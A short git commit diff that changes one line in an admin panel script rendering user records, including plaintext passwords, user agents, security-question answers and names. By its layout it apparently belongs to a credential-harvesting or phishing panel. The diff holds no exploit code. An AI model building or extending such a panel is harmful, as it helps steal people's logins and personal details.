948d3e36d81f63965d50889398882b2afad0bfd8
wghari <1786126@crosemont.qc.ca>
2024-01-25 18:32:30 -0500

    nothing

--- public/admin/panel/script.js
+++ public/admin/panel/script.js
@@ -127,7 +127,7 @@ function updateConnectionsTable(users) {
             <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
             <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
               <li class="list-group-item">----------------------------------------------------------</li>
-              <li class="list-group-item">Question: ${details.getUserDataQuestion || ''}</li>
+              <li class="list-group-item">Question: ${JSON.stringify(details.getUserDataQuestion) || ''}</li>
                 <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || ''}</li>
             <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || ''}</li>
